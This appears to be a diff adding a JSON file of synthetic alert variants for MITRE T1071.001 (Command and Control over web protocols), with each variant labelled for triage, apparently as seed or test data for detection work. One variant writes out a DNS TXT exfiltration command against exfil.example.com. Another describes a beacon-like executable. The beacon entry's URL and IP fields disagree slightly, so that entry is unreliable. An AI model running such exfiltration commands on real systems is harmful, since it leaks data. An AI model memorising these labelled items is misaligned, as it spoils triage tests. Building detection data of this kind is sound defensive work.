@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1071.001",
+  "technique_name": "Web Protocols",
+  "tactic": "Command and Control",
+  "rule_id_pool": ["86001", "86002", "86003"],
+  "variants": [
+    {
+      "label": "true_positive",
+      "level": 12,
+      "description": "DNS query to high-entropy DGA-style domain",
+      "image": "C:\\Windows\\System32\\svchost.exe",
+      "command_line": "svchost.exe -k NetworkService",
+      "parent_image": "C:\\Windows\\System32\\services.exe",
+      "user": "SYSTEM",
+      "domain": "x7a9bs2qkpm4z1nvw.example.net"
+    },
+    {
+      "label": "escalate",
+      "level": 10,
+      "description": "Periodic HTTP GET pattern resembling Cobalt Strike beacon",
+      "image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\update.exe",
+      "command_line": "update.exe",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "user": "jdoe",
+      "url": "http://198.51.100.42/ca",
+      "ip": "198.51.100.142"
+    },
+    {
+      "label": "true_positive",
+      "level": 11,
+      "description": "DNS TXT record exfiltration pattern",
+      "image": "C:\\Windows\\System32\\nslookup.exe",
+      "command_line": "nslookup -type=TXT YWJjZGVmZ2hpamtsbW5vcA.exfil.example.com",
+      "parent_image": "C:\\Windows\\System32\\cmd.exe",
+      "user": "alice",
+      "domain": "exfil.example.com"
+    },
+    {
+      "label": "false_positive",
+      "level": 4,
+      "description": "Browser POST to Pastebin from developer workstation",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "command_line": "chrome.exe https://pastebin.com",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "user": "devuser",
+      "url": "https://pastebin.com/raw/aBcD1234"
+    },
+    {
+      "label": "false_positive",
+      "level": 5,
+      "description": "CDN connection from corporate browser",
+      "image": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+      "command_line": "firefox.exe https://cdn.partner.example.com",
+      "parent_image": "C:\\Windows\\explorer.exe",
+      "user": "carol",
+      "domain": "cdn.partner.example.com"
+    }
+  ]
+}
